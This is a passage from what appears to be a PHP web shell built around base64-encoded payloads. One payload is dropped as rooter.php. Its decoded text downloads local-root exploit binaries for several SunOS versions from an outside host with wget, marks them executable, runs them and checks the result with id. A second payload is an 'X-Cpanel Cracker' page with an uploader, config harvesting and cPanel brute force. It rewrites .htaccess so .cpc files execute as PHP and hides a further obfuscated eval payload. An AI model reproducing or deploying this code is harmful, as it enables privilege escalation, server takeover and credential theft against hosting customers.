m1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvU3VuT1MlMjA1Ljkvc3Vub3M1OSIpOwpzeXN0ZW0oImNobW9kIDc3NyBzdW5vczU5Iik7CnN5c3RlbSgiLi9zdW5vczU5Iik7CnN5c3RlbSgiaWQiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvU3VuT1MlMjA1LjgvZmluYWwiKTsKc3lzdGVtKCJjaG1vZCA3NzcgZmluYWwiKTsKc3lzdGVtKCIuL2ZpbmFsIik7CnN5c3RlbSgiaWQiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvU3VuT1MlMjA1Ljcvc29sYXJpczI3Iik7CnN5c3RlbSgiY2htb2QgK3ggc29sYXJpczI3Iik7CnN5c3RlbSgiLi9zb2xhcmlzMjciKTsKc3lzdGVtKCJpZCIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC9TdW5PUyUyMDUuMTAvc3Vub3M1MTAiKTsKc3lzdGVtKCJjaG1vZCAreCBzdW5vczUxMCIpOwpzeXN0ZW0oIi4vc3Vub3M1MTAiKTsKc3lzdGVtKCJpZCIpOwoKCnByaW50ICJFbmQgU3VuT1MgLi5bK11cbiI7Cn0=';
		$file = fopen("rooter.php","w");
		$write = fwrite ($file ,base64_decode($rooter));
		fclose($file); 
		header("location:rooter.php");		} 

		if(isset($_POST['cpc'])){
		$cpc = 'PD9waHAKQHNlc3Npb25fc3RhcnQoKTsgCkBlcnJvcl9yZXBvcnRpbmcoMCk7IApAaW5pX3NldCgnZXJyb3JfbG9nJyxOVUxMKTsgCkBpbmlfc2V0KCdsb2dfZXJyb3JzJywwKTsgCkBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLDApOyAKQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7CkBpbmlfc2V0KCdvdXRwdXRfYnVmZmVyaW5nJywwKTsgCkBzZXRfdGltZV9saW1pdCgwKTsgCkBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7IAoKPz4KPGh0bWw+Cjx0aXRsZT5YLUNwYW5lbCBDcmFja2VyIGJ5IFdhamRhbiBCdXR0PC90aXRsZT4KPGJvZHk+Cgo8U1RZTEU+dGV4dGFyZWF7YmFja2dyb3VuZC1jb2xvcjojMTA1NzAwO2NvbG9yOmxpbWU7Zm9udC13ZWlnaHQ6Ym9sZDtmb250LXNpemU6IDEwcHg7Zm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzAwMDAwMDt9CmlucHV0e0ZPTlQtV0VJR0hUOm5vcm1hbDtiYWNrZ3JvdW5kLWNvbG9yOiAjMTA1NzAwO2ZvbnQtc2l6ZTogMTBweDtmb250LXdlaWdodDpib2xkO2NvbG9yOiBsaW1lOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2O2hlaWdodDoyMCB9CmJvZHkgeyBmb250LWZhbWlseTogVGFob21hfQoueC1pbmogeyBmb250LWZhbWlseTogVml2YWxkaX0KdHIgeyBCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsgY29sb3I6ICMwMGZmOyB9CnRkIHsgQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7IGNvbG9yOiAjMDBmZjsgfQoudGFibGUxIHsgQk9SREVSOiAwcHggQmxhY2s7IEJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOyBjb2xvcjogIzAwZmY7IH0KLnRkMSB7IEJPUkRFUjogMHB4OyBCT1JERVItQ09MT1I6ICMzMzMzMzM7IGZvbnQ6IDhwdCBWZXJkYW5hOyBjb2xvcjogIzAwZmYwMDsgfQoudHIxIHsgQk9SREVSOiAwcHg7IEJPUkRFUi1DT0xPUjogIzMzMzMzMzsgY29sb3I6ICMwMGZmOyB9CnRhYmxlIHsgQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7IEJPUkRFUi1DT0xPUjogIzMzMzMzMzsgQkFDS0dST1VORC1DT0xPUjogQmxhY2s7IGNvbG9yOiAjMDBmZjsgfQppbnB1dCB7IGJvcmRlcjogZGFzaGVkIDFweDsgYm9yZGVyLWNvbG9yOiAjMzMzOyBCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsgZm9udDogOHB0IFZlcmRhbmE7IGNvbG9yOiAjMDBmZjsgfQpzZWxlY3QgeyBCT1JERVItUklHSFQ6ICBCbGFjayAxcHggc29saWQ7IEJPUkRFUi1UT1A6ICAgICMwMGZmIDFweCBzb2xpZDsgQk9SREVSLUxFRlQ6ICAgIzAwZmYgMXB4IHNvbGlkOyBCT1JERVItQk9UVE9NOiBCbGFjayAxcHggc29saWQ7IEJPUkRFUi1jb2xvcjogIzAwZmY7IEJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOyBmb250OiBwdCBWZXJkYW5hOyBjb2xvcjogIzAwZmY7IH0Kc3VibWl0IHsgQk9SREVSOiAgYnV0dG9uaGlnaGxpZ2h0IDJweCBvdXRzZXQ7IEJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOyB3aWR0aDogMzAlOyBjb2xvcjogIzAwZmY7IH0KdGV4dGFyZWEgeyBib3JkZXI6IGRhc2hlZCAxcHggIzMzMzsgQkFDS0dST1VORC1DT0xPUjogQmxhY2s7IGZvbnQ6IEZpeGVkc3lzIGJvbGQ7IGNvbG9yOiAjOTk5OyB9CkJPRFkgewlTQ1JPTExCQVItRkFDRS1DT0xPUjogQmxhY2s7IFNDUk9MTEJBUi1ISUdITElHSFQtY29sb3I6ICMwMGZmOyBTQ1JPTExCQVItU0hBRE9XLWNvbG9yOiAjMDBmZjsgU0NST0xMQkFSLTNETElHSFQtY29sb3I6ICMwMGZmOyBTQ1JPTExCQVItQVJST1ctQ09MT1I6IEJsYWNrOyBTQ1JPTExCQVItVFJBQ0stY29sb3I6ICMwMGZmOyBTQ1JPTExCQVItREFSS1NIQURPVy1jb2xvcjogIzAwZmYgbWFyZ2luOiAxcHg7IGNvbG9yOiAjMDBmZjAwOyBiYWNrZ3JvdW5kLWNvbG9yOiBCbGFjazsgfQoubWFpbiB7IG1hcmdpbjogLTI4N3B4IDBweCAwcHggLTQ5MHB4OyBCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsgQk9SREVSLUNPTE9SOiAjMzMzMzMzOyB9Ci50dCB7IGJhY2tncm91bmQtY29sb3I6IEJsYWNrOyB9CkE6bGluayB7IENPTE9SOiBXaGl0ZTsgVEVYVC1ERUNPUkFUSU9OOiBub25lIH0KQTp2aXNpdGVkIHsJQ09MT1I6IFdoaXRlOyBURVhULURFQ09SQVRJT046IG5vbmUgfQpBOmhvdmVyIHsgY29sb3I6ICMwMGZmMDA7IFRFWFQtREVDT1JBVElPTjogbm9uZSB9CkE6YWN0aXZlIHsgY29sb3I6ICMwMGZmMDA7IFRFWFQtREVDT1JBVElPTjogbm9uZSB9CjwvU1RZTEU+CgoKPD9waHAKQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7CkBpbmlfc2V0KCdvdXRwdXRfYnVmZmVyaW5nJywwKTsgCmVjaG8gIjxjZW50ZXI+Cgo8aW1nIHNyYz0naHR0cHM6Ly9lbmNyeXB0ZWQtdGJuMi5nc3RhdGljLmNvbS9pbWFnZXM/cT10Ym46QU5kOUdjUU5TUVNjdGpsdGFENkVwWkNJTEpxY2xuZVdsTWR1SnJoWVY4RHVkRDFLTjB1aWt3dVonPjxicj4KPGI+PGZvbnQgY29sb3I9JyMwMGZmMDAnIGNsYXNzPSd4LWluaicgc2l6ZT0nNSc+WC1DcGFuZWwgQ3JhY2tlciBCeSBXYWpkYW4gQnV0dCA8L2ZvbnQ+PGJyPjxicj48YnI+PC9iPjxiPgo8Zm9udCBzaXplPSczJz4KfHwgPGEgaHJlZj0nP2RvPXVwbG9hZGVyJz4uL1VwbG9hZGVyPC9hPiB8IDxhIGhyZWY9Jz9kbz1jb25maWcnPi4vQ29uZmlnPC9hPiB8IDxhIGhyZWY9Jz9kbz1iaGNvbmZpZyc+Li9CLUYgQ29uZmlnIENwYW5lbDwvYT4gfCA8YSBocmVmPSc/ZG89YnJ1dGUnPi4vQ3BhbmVsIEJydXRlRm9yY2U8L2E+IHx8PC9iPjxicj48YnI+PGJyPjwvY2VudGVyPjwvZm9udD48YnI+ICI7CgppZihpc3NldCgkX1JFUVVFU1RbJ2RvJ10pKXsgCnN3aXRjaCAoJF9SRVFVRVNUWydkbyddKXsKIyMjIyMjIyMjIyMjIyMjI3BocCBpbmZvCmNhc2UgJ2JoY29uZmlnJzsKZWNobyAiPGNlbnRlci8+PGJyLz48Yj48Zm9udCBjb2xvcj0jMDBmZjAwPistLT09WyBCLUYgQ29uZmlnIF09PS0tKzwvZm9udD48L2I+PGJyPjxicj4iOwogIG1rZGlyKCdiY29uZmlnJywgMDc1NSk7CiAgICBjaGRpcignYmNvbmZpZycpOwogICAgICAgICRha3NlcyA9ICIuaHRhY2Nlc3MiOwogICAgICAgICRidWthX2xhaCA9ICIkYWtzZXMiOwogICAgICAgICRidWthID0gZm9wZW4gKCRidWthX2xhaCAsICd3Jykgb3IgZGllICgiRXJyb3IgY3V5eSEiKTsKICAgICAgICAkbWV0aW4gPSAiT3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQpBZGRUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwIC5jcGMKIjsgICAgCiAgICAgICAgZndyaXRlICggJGJ1a2EgLCAkbWV0aW4gKSA7CiAgICAgICAgZmNsb3NlICgkYnVrYSk7CiRjb25mc2hlbGwgPSAnUEQ5d2FIQWdMeW9nZkh3Z1NXUmxZU0E2T2lCTmNpNUJiSE5oTTJWcklIeDhJRkJ5YjJkeVlXMXRhVzVuSURvNklFY3RRaUI4ZkNCRVpYTnBaMjVsY2lBNk9pQkJiQzFUZDJsemNtVWdmSHdnS2k4a1QwOVBNREF3TURBd1BYVnliR1JsWTI5a1pTZ25KVFkySlRZM0pUTTJKVGN6SlRZeUpUWTFKVFk0SlRjd0pUY3lKVFl4SlRNMEpUWXpKVFptSlRWbUpUYzBKVFpsSlRZMEp5azdKRTlQVHpBd01EQlBNRDBrVDA5UE1EQXdNREF3ZXpSOUxpUlBUMDh3TURBd01EQjdPWDB1SkU5UFR6QXdNREF3TUhzemZTNGtUMDlQTURBd01EQXdlelY5T3lSUFQwOHdNREF3VHpBdVBTUlBUMDh3TURBd01EQjdNbjB1SkU5UFR6QXdNREF3TUhzeE1IMHVKRTlQVHpBd01EQXdNSHN4TTMwdUpFOVBUekF3TURBd01Ic3hObjA3SkU5UFR6QXdNREJQTUM0OUpFOVBUekF3TURCUE1Ic3pmUzRrVDA5UE1EQXdNREF3ZXpFeGZTNGtUMDlQTURBd01EQXdlekV5ZlM0a1QwOVBNREF3TUU4d2V6ZDlMaVJQVDA4d01EQXdNREI3TlgwN0pFOVBUekF3TUU4d01EMGtUMDlQTURBd01EQXdlekI5TGlSUFQwOHdNREF3TURCN01USjlMaVJQVDA4d01EQXdNREI3TjMwdUpFOVBUekF3TURBd01IczFmUzRrVDA5UE1EQXdNREF3ZXpFMWZUc2tUekJQTURBd1R6QXdQU1JQVDA4d01EQXdNREI3TUgwdUpFOVBUekF3TURBd01Ic3hmUzRrVDA5UE1EQXdNREF3ZXpWOUxpUlBUMDh3TURBd01EQjdNVFI5T3lSUE1FOHdNREJQTUU4OUpFOHdUekF3TUU4d01DNGtUMDlQTURBd01EQXdlekV4ZlRza1R6QlBNREF3VHpBd1BTUlBNRTh3TURCUE1EQXVKRTlQVHpBd01EQXdNSHN6ZlRza1R6QlBNREJQVHpBd1BTUlBUMDh3TURBd01EQjdNSDB1SkU5UFR6QXdNREF3TUhzNGZTNGtUMDlQTURBd01EQXdlelY5TGlSUFQwOHdNREF3TURCN09YMHVKRTlQVHpBd01EQXdNSHN4Tm4wN0pFOVBUekF3TURBd1R6MGtUMDlQTURBd01EQXdlek45TGlSUFQwOHdNREF3TURCN01UUjlMaVJQVDA4d01EQXdNREI3T0gwdUpFOVBUekF3TURBd01Ic3hOSDB1SkU5UFR6QXdNREF3TUhzNGZUc2tUMDlQTUU4d1R6QXdQVjlmUmtsTVJWOWZPeVJQVHpBd1R6QXdNREE5TUhneE1EZGpPMlYyWVd3b0pFOVBUekF3TURCUE1DZ25Ta1U0ZDAxRVFsQk5SVGgzVFVRd2ExUXdPVkJOUkVGM1ZIcEJkMHREVWxCVU1EaDNWSHBDVUUxRVFYTktNMHBwU25sck4wcEZPSGRVZWtGM1ZEQTRkMDFEWjJ0VWVrRjNUVVU0ZDFSNlFYZE1SRUkwVGtkTk1FdFVjMnRVTURoM1RVVTRkMDFGT0hkUVUxSlFWREE0ZDAxRVFYZFVla0Z2U2tVNVVGUjZRWGROUkVGM1ZIbG5hMVI2UWxCTlJFSlFWSHBCZDB0RFVsQk5SRUYzVkhwQ1VFMUVRWE5OU0dkNFRqSk5jRXhEWkVaaWJsSnNZMjVzZG1SWVpISmhSa3BKVjFWMFQxWXdPVlpXUlVab1VXMUtSRmt3VW10U2JWcElXakJzY0ZOdGNFMWlSVEYwVlVoQ1VtTldUbnBXYmxwWlpVWndOazFFUlhsTmVsRXhUbXBqTkU5VGMzWlFVMk56U2pCR1ExRXdVa1pTYTJSSlUxVndURlJGTVU5VU1VSlNWV3hPVlZaV1dsaFhSbXhoV1ZkS2FscEhWbTFhTW1od1lXMTBjMkpYTlhaalNFWjVZek5TTVdSdVpEUmxXRzkzVFZSSmVrNUVWVEpPZW1jMVMzazRia3RUYXpkYVdGcG9Za05uYTFRd09IZE5SVGgzVFVVNGQwdFVjejBuS1NrN2NtVjBkWEp1T3o4K2ZrUnJjamxPU0dWdVRraGxiazVJWlRGNlpuVnJaMFpOWVZoa2IzbHFZMVZKYldJeE9XOVZRWGg1WWpFNGJWSjBkMjEzU2pSTVZEQTVUa2h5T0ZoVWVrVllVa3AzYlhkS1dFeFVNRGxPU0dWRldFaHlPRmhvZEU5T1ZEQTRXRWhsUlZoSWNqaFFhM0k0V0ZSNlJWaFVNRGhZU0hSSlRGUjZSVmhJY2poWVZIcEZXRkowVDA1VWVrVllWSHBGV0VobFJYQlNkR1o1WkcxUGJFWnRiSFptWW1aeFJIbHJkMEpCYzB0aE1EbGhZWEo1YVZkTmEyVkRNRTlNVDAxamRXTXdiSEJWVFhCSVpISXhjMEYxYms5R1lWbDZZVzFqUTBkNWNEWklaWEphU0hwWE1WbHFSalJMVlZOMlRsVkdVMnN3ZVhSWE1FOTVUMHhtZDFWQmNGSlVjakZMVkRGdVQwRnNXVUZoWVdOaVFubHNSRU5DYTJwamIyRk5ZekpwY0VSTmMxTmtRalYyUm5WNVdrWXpUekZtYldZMFIySlFXRWhVZDNwWlpVRXlXWHBKTldoYU9HMW9WVXh3U3pKamFtUnZPWHBqVlVsTVZIcEZXRWh5T0ZoVWVrVllhRlJ6YkdaTmVWTm9kRTlPVkhwRldGUjZSVmhVZWtWd1MxZzlQWFJ0V1d4bWVUa3dSRUl4YkdJeWVIQmtRbXd3YUdWRmNFdFljR3hHYld0MlJtdzVXbU5pYm5aR2JVOXdaRTFHVUVoMFREZDBUV3hOYUc5c2VrWXlZVEJvZEU5blFYSTVWR0Y1VTIxbVltdFRhekV3Y0doaVUyaHJkV0ZhWkhSRk9YZDBUMmRCY2psVVlYbFRiV1ppYTFOck1UQTNkRzB4YkdSMVdXeEhXRkJNWm1KclUzZGxNRWxyTW1rd1puVkZObEphT1RObU0wWldhM3BUYUdkWGNHeERNbWwyZDNSR09IZEJUMDVYTVU5alFYSkJTVlY1VDFsVVpUUm9UbTlwTUdSQ1dDdDBhbmhRWTBKNVRFNUpVRGhtYjJ3d1pHOUJLMWRLTVc5M2NsbDJaRTFqY0dNeE9XcEJiM2xXWTBKWU9GSXpUM0JtYjNoc1RrbFFPRVl6VHpWa2IwRkpablZzV0dOVU1FcG1iMkUwWm5RNWFrWXpTRXBPU1ZCb1EwMDVURWRpVTJoM2RFVkpaRUo1V21NeWJGWjNaVkJKUTJKaE1HUjZVMmgzZEVWSlEwMTVha1F5Wmxwa00yRldZM1F4YW1ReWVIWkdhbEJxWTJwalRWbE5RekpMV0ZCSmQzUnVhbVF5ZUhaR2FsQkpkM3BJZWt0VVREVkxWRk5vZDNSRlNXTk5PVlptZERGTlEwSXhjR1IxVERaM2RVOXBSRzg1YzBOVldFbGpNbUZXWTJKamFWSjBibE5tUWxsd1kyOXlVMlIxWVdwRVFrOXBkMjltV2tOQ05VeGpWVmhKUTJKcmNFTkNXRk4zYjJsc1pIVmpiR1p2YkdwRFZWaEpSako1VmtaYU1YcGpZbXR3WTJwVGFIZDBSVWxqVFRsV1puUXhUVU5DTVhCa2RVdzJkMlZ5TUVaMVNUZDBTa1ZKZDNWUGJFZDFWM05EUW5od1l6STBObmR2V1d4a2JVOXNSbXBUYUhkMFJVbDNiMk4yWkcxWGMyWXlZWEJqTW1rd1MwcHVTbVF5ZUV4M1pWTm9aMWRRYUVSQ05WaG1ZbGRUWm05aE5HWnZlVnBqUW5KVFJqSmhVMk5DV1RCSFdIQk5aREkxTUZKaVpteEVRbVpRWm1WUVNVTk5PVk5qWlZOb1F6STVVMlF6ZHpaM2RFaFlTR1ZGV0VobFJUZDBUV3QyUmsxUGJFWnFVRWxJWW00MGQzVlpkbVJ2YkV4M2RGbGxWekJaWlZjd1NEZDBUV3RwUXpKemJVWk5PVEZrVFZkelF6STVVMlF6ZHpaM2RXWlFSR0pQYkV0WWNGaERRazlNUkVJMWJVdEtSWHBHZFVrM2RFMXJka1pOVDJ4R1NqRmFRMEpQY0daaVNEWjNaV1pZUjJWVGFHZFhVR2hFUWpWWVptSlhObU5OT1dwbVlsazNkRWxRU1VOTk9UUlNZbGxRUTBKUGRtWjZVRWxJZFc0MGQyVnVXRWQwUlRGR2RVbEpkM3BGV0V0QlF6VlBhbE5vZEcwd2FIY3lZM1prTTA5c1JrcEZTVWRZVUdoRE1qbFRaRE4zTm5kMFNGaElaVVZZU0dWRk4zUk5ZM1prYlZkelkwMTVjMFJDZURWTFNrVjRXWFZ1TkV0WWNEQmpZbWt3VW1KWlVFTkNUM1ptZWxCSlNIVnVOSGRsYmxoSGRFVjRSblZKU1hkNlJWaElaVVZZU0dWVGFHTk5PVlptZERFelkwSnNiVVIxVnpaM2J6VjJSazB4YVdSbFUyaG5WM0JwUjFoUVNYZDFUMnhIZFZkelkyOWhhbVF6YTJsbWIyeDJaR3BRU1dSTk9WWmpWRk5vZDNSdWFtUXllSFpHYWxCcVNIcElla2g2U0hwTFdIQTVkR3BZZGtZelR6VmtiMEVyZEdwWWRrUnZZV2xqWlRSb1RtOXJkbU4xVEN0MGFuaE1SR0pEU1VSQ1Z6bDNiVTkyWkRKWVNrNUpVRGhWWlhKSlJqTlBOV1J2UVRsM1RWbDJaRzg1V2t0S1JXcFpaVmN3V1dWWE1FdGFiakJqWW1rd1VtSlpVRU5DVDNabWVsQkpTSFZ1TkhkbGJsaEhkRVY0Um5WSlNYZDZSVmhJWlVWWVNIUjNOMlp2WVRSbWRERnBaRzlzYldScVVFbERNbUZXWm05aFdrdDZOWFJTUVVOSlZ6STVWbU5OYkcxaU1sbFhRMEkxYkdSbFdIWlZaWElyZEdwNFRXUXphM04zYnpGc1ptOXBkbU5sTUVwQmNqbFVZWFIzSzNScWVIQmtiVzR4Wm5SdVZrTkNNV3hPVldzeFJrMVlTbmQxVHpWR2IwRTVkMjFQYkVkMVYwcDNkV05wWkhWaGJFNVZkMjFTU2s4eFJrMVlWbXRhZDBsR01tdzJZMVF3U2xsbFJVcDNkRGdyZEdwNGNHUnRiakZtZEc0d1IySnViRTVWYTNwbVFtdHpSR0pYU25kMVkybGtkV0ZzVGxWclZHWnZlVnBtZEVVcmQwcEZkazVKVURoU01tTjJSazB3SzA1dmExcDNkRGdyVG05clduZDBPQ3RyZWxOb1JFSkRVRVJpV1hwallsZFFhM2s1VjFReFdVRkNXbVl4UmsxWWJXSlZUSEJIV0hCd1kwcEphV05OYkZOallUbHRZMkpQWjBNeU9WWm1iMkZXWm5WSVVHdDFZVnBrZEV4d1IxaHdiRU15YVhaM2RHWjVSbTFyZGtaS05FbFZRalV5UTBKNGNHTjBibUZCVEZoV2EzcFRhR2RDWVZOR01tRTNkRXBQYVhkbE1FbElaVk5vWTAwNVdtTkNlV3BFZEdsdFkySlBaMk52ZVRCRFZVbE1abUpyVTJoVmJtbEdXa1ZNUkVJMVRXUmFiRGQwVFd4TmFHOTRkbU15YkZab2RFOXdaRTFqZGtKNmJtWlNkRTl3WkUxamRrSjZlV1pvVld3M2RFMWhha1J2T0VsM2FuaEtkM1ZaTUVkQ2VHeE9WVVpKUXpJNVUyUXpkelozZEVnMFNHVkpXRXRsUlVsTFdtNHdZMkpwTUZKaVdWQkRRazkyWm5wUVdFWjFTVWxJZFc0MGQyVjVXRWQwUldwTFpVVTBTR1ZKV0hkbFUyMU9iRk54WWxWdVlVWXlZVnBrVFhselkxVkZUWGQ1Ym1sR00xa3paRE5yVEhkbFVEaFNNbmNyZDNSRk9FTktibnBtZFd4VFkxUXdiWGR2V1haa2J6bGFTMHBGYWtobFJWaEljbU52ZDJWVFNXWnZZVFJtZERGNlJHOTVUR1F6UmpaSWRXNDBkMlZ1V0VkMFJYaEdkVWxKZDNwRldFaGxibTlQU2tVM2EzbzFaR3R2YkZaalRUbGtTSGt4Wms1ME9VcE9Ta1U0UTBwdWVtWjFiRk5qVkRCdGQyOVpkbVJ2T1ZwTFNrVnFWekJJV0VobFJWaExXbTR3WTJKcE1GSmlXVkJEUWs5MlpucFFXRVoxU1VsSWRXNDBkMlY1V0VkMFJXcFhNRWhZU0dWRldFdGFSaXRDV2s5d1pFMWpka0o2ZVdaaVZGaDJRMm8wT0VOdGQwbFNlalJLUzFoUVRFTlZVM0ZMV0hBNWRHMHdhR05DV1ZCa1drVktUbTkzU1VZelR6VmtiMEU1YTFwdWFtUXllSFpHYWxCSmQzcEpXRXRsUlRSSWRFVTNkM1ZQYkVkMVYzTkdNbWxwWTI4NU0wdHFibGhIZEVWWVJuVkpTVWhpYmpSM2RFZzBTR1ZKV0V0bFJVbExXa1lyVG05cFdrNUtUMmwzY2xsWVEwSTFiR1IwYm05a00yRldZMjloVEZKcWVFcEdTa1YyVGtwM04zUnRNR2huVjNCc1F6SnBkbmQwUmpoRGJYZEpVbm8wT0VOdGQwbFNlalE0UTIxM1NWSjZORGhEYlhkSlVubzBPR052YkRKM2IyeE1UbFZyVFdReU9UQmpZbmRLVG0xNE9IZHliRXhqUW5KSlMycFFTVlJpZDFaWFFuaDZRMVJaYkVSYWJqaG5kRzVYUmswNWJVWk5lWE5rUW14V1kxcEZOa3RLYm5WU1FYZEpaM1ZZU1U5dllYcEVRbVpXWTJKM1NVdHFVRWxYUWxoelFUTm1jRVl6YTJ4M2RYZzRkMlZZZG1OdmJESk9TVkE0VWpKUGNHWnFORGhTTW10MlkzVk1LM1JxV0haRWRVOXpaR1UwYlV0WWNFMW1RalZxWm05c2RtUktibXhIZEVsTVExVllURU5LV0V4bWIyRTBablJzTjNSS1QyeEhkVzVUWkRKUGJIZGxNRWxqWW1sWVpHODVUR05WU1V4RFZWaE1abTloTkdaMFREZDBTazlzUjNWdVUyUXlUMngzWlRCSlkySnBXR1J2T1V4alZVbE1RMHBZVEdOaWFWaGtiemxNWTJGVGVHSlZURGQwYld0c1puVmhXbVJLUlV4alltbFlaRzg1VEdOaFUxaGlWRk5vWjFkd1RXWkNOV3BtYjJ4MlpFcHVVMlF5Wm5Ca1NrbE1abUpaYkVaS1dFeEdiM2w2Umxwc04zUktUMnAzWlRCSlYyOHhOVVl6ZVZOaU1sbDJaRTAxYkVNelYxQnJNbmgyUXpKNVUwUnZPWHBtZEVaVGEzVmhlbU5pZDFOcmRXNXBSak5JY0V0WWNIQmpTa2xNUTFwc04zUk5NVFZHTTNsVFlqSlpVMlF6V1d4b2RFOXFhRlJUYUVaTllUQm1ZbXRXZDNWUFdtWkNRVGQwYlRGc1pIVlpiRWRZY0ZwallrOHhSazAwU1dOTmVWTkdNa0UzZEcwd2FHZFhjRTFtUWpWcVptOXNkbVJLYm0xallrOW5ZMjk1TUVOVlNVeG1ZbXRUYUdKVGFHdHZlVnAzWlRCSlEySnJXa05pVEZCcmVuSldablZwTUd0YVdHMUlTalV3UjNWWGJWSjBSbnBTYlU4MFpuUkdVMnQ2VjFabWRXa3dhMXBZYlZsVk5UQkhkVmR0VW5SR01sSnRUelJtZEVaVGEzcEdWbVoxYVRCcldsaHRTM1ExTUVkMVYyMVNkRVkxVW0xUE5HWjBSbE5yZWtWV1puVnBNR3RhVERkMFNrOTZSazFJU1U1VmJrMUVRbmhzWWpKbWJHWjVPV3BrTWpVd1kwSTFNRVphU1V4bVltdFRhRlJUYUd0dlkzQmtiMkY2ZDJVd1NXTmlhVmhrYnpsTVkxVkpiVTV2Y2tsRWRXdHNZMm93U210YVdFeEdNMnRxYUZSVGFHdHZUMmxtYjNKSlRsVnVhVVp0YTJsSFZVbHdTMWh3VFdRemEyeERRbGxRYUhSUFRVUkNlR3hHV201cFJscEZURVJDVnpsT1NrOU5SRUo0YkdoaVUyaEVRa05RYTI5c1RIZGxNRGwzWlVWd1IxaHdhbVF5TlRCRVFqVXhZMVJUYUdkWFVFeGpUV3hUWTFWRk9YZHZZVFJHYjNoMlkyOUJVR3RhZHl0cldsaE1ZMDFzVTJOVlREZDBTazlOUkVKNGJIZGxNRWxtZFd0d1pGVkpUR05OYkZOallWTllZbFZNTjNSTmJFMW9kSGxzUmsxaGJVUlZTVzFTYlU4MFpuUkdVMnR2WTNCa2IwRndhR0pUYUVNeU9WWm1iMnhXWmtKQk4zUnRNR2hyZFZsYVExcEZPWGR2WTNCa2IyRm5ZekpoTUdJeVdYWmtiVTlzWkcxUGVtaDBkMHhtWW10VFVscFBUVVJDZUd4M1NrdzNkRTFzVFdoMGNreEdNMnRxYUdKVGFFTXlPVlptYjJ4V1prSkJOM1J0TUdocmRXRjZZMkozU1U1VmJucG1kV3RuUmsxaFdHUnZlV3BqVlVsTVEySjNVMnRhUmxOcmIyTndaRzlCY0V0WVVFeG1ZbGxzUmtwRk9YZDFXVEJHYkRsYVkySnVVME5DV1d4b2RFOXBSa3BZYld0YVdFeG1ZbGxzUmtvMGJWSnRUelJtZEVad1MxaFFUR1ppV1d4R1NrVTVkM1ZaTUVac09WcGpZbTVUUTBKWmJHaDBUMmxHU2xodGExcFlUR1ppV1d4R1NqUnRVbTFQTkdaMFJuQkxXRkJNWm1KWmJFWktSVGwzZFU5YVJFSXdVRVl6VDFwaU0ydHNSbTk0YVVNeVFWQnJXalV3UjNWWGJWSjBSbTFTZEU4eFJqSmhXbWhWVERkMFRXeE5hRzloV21OQ1puQm9kR3RpWkROclRFRjFhMnhHTTBoS1VuUlBla1pOU0hCb1lsTm9hM1Z1YVVZelNFbE9WVzVzUjNSSlNtTnZZVTFFUWpWc2FIUm1jbGRzT1ZkWFlWbFVZVEE1VlU5MFJsTjNkRVpLVW5SM2JXaFVVMHBTZEU5NlJrMUljRXRZVUV4amIza3dRMkZ6Wm5kbE1FbERZbXRhUTJKTVVHdDFZWHBqWW5kVGEzVnVhVVl6U0hCTFdIQTVZMEo0ZW1OaVUyaHJkVTkyUkRKaFZrWmFSVGwzZFU5MlJESmhWbUl5Wm14bWVUbHBaRzlZVUd0MVdWcERXa3czZEUxamRrWk5ZV2xETWtsUWEzVlBka1F5WVZaR1dtNXBSbHBGVEdadk9YRmpRalJ3UjFod2NHTktTV2xyZFU5MlJESmhWa0o2ZVdab1lsTm9Rekk1Vm1admJGWm1Ra0UzZEcwd2FHdDFUM1pFTW1GV1pFMTVjMk5WUlRsM2RVOTJSREpoVm1JeU5XbGtRa0ZRYTNWUGRrUXlZVlpDZW01bWFGUlRhRVJDUTFCcmRVOTJSREpoVm1STmVYTmpWVVZwVGxWRmJXRjVPVUpYWVd0clYwRnJTRTlWUm5CSFdIQnFaREkxTUVSQ05URmpWRk5vWjFkUVRHWk5lVnAzWlRCSmEzVlBka1F5WVZaQ2VubG1TMWh3Y0dOS2FXeEdUV0Z0UkZWSmJVWnZlWHBHV2taVGEzVmphVVpLVEhCSFdGQk1ZMHBGT1hkMVdUQkdiRGxhWTJKdVUwTkNXV3hvZEVaSmExcFliV3RhZUd4SGRFbE1aazE1V2xKMFJqZHJXbGhNUmpOcmFtaFZURGQwU2s5cGQyVXdTV1oxYTNCa1ZXbHNSM1JKU2s1VlJrcFNkSGR0ZDBwWVRHTktUSEJMV0ZCTVEwcEZPWGQxVDFwRVFqQlFZMkpKVUd0YWQyMVNkRVpLYTFwWVRHTktUSEJMV0hCd1kwcEpURU5WUldsT1ZVVnRhMXBzTjNSS1QxaERZbGw2ZDJVd1NXdHZjamQwYlRGc1pIVlpiRVJDUTFCcmIzZEpkMVF3U1d0YVJuQkhXRkJNUm05NWVrWmFSVGwzZEU5S1MxaHdPWFJOYkUxb2RFOVlRMkpaZW5kbE1EbDNkRVp0YUdKVGFFTXlPVlptYjJ4V1prSkJOM1J0TUdocmIwOXBabTk1WkdKVlJUbDNiM2xhUmsxNU5XaDBUekZHTW1GYVVuUlBXRU5pV1hwb1ZGTm9aMWR3T1hSd